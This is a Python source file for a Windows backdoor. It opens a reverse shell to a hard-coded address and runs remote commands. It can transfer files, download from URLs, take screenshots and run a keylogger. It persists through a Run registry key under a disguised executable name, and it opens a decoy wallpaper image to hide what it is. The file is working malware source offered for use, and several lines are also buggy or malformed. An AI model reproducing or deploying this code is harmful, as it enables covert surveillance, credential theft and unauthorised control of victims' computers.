#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
import threading
import key


#pip install mss en cmd
from mss import mss





def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data)

def reliable_recv():
	data= ""
	while True:
		try:
			data= data + sock.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

#Admin checker
def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join(os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
	except:
		admin = "[!!] User privileges!"
	else:
		admin = "[+] Admin privileges!"

#Download file from INTERNET (requests module)
def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as output_fil:
		output_fil.write(get_response.content)

def connect():
	while True:
		time.sleep(20)
		try:
			sock.connect(("my ip 192.168.1.9", 54321))
			shell()
		except:
			connect()


def shell():
	while True:
		command = reliable_recv()
		if command == 'q':
			continue
		elif command == "exit":
            break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read))
		elif command[:6] == "upload":
				with open(command[7:], "wb") as fin:
					file_data = reliable_recv()
					fin.write(base64.b64decode(file_data))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] File downloaded")
			except:
				reliable_send("[-] Failed to download")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[-] Failed to take screensht")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started")
			except:
				reliable_send("[!!] Failed to start ")
			
		elif command[:5] == "check":
			try:
				is_admin()
				realiable_send(admin)
			except:
				reliable_send("Cant perform the adm check")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target= key.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path, "r")
			reliable_send(fn.read)
		else: 
			proc = subprocess.Popen(command, shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE, stdin= subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			reliable_send(result)

#Path y persistence
keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
location = os.environ["appdata"] + "\\windows32false.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v nameOfBackdoor /t REG_SZ /d"' + location + '"', shell=True)

	file_name = sys._MEIPASS + "Dragon-Walpapper-Ch.jpg"
	try:
		subprocess.Popen(file_name, shell=True)
	except:
		o = 1
		a= 2
		e= o + a


sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()


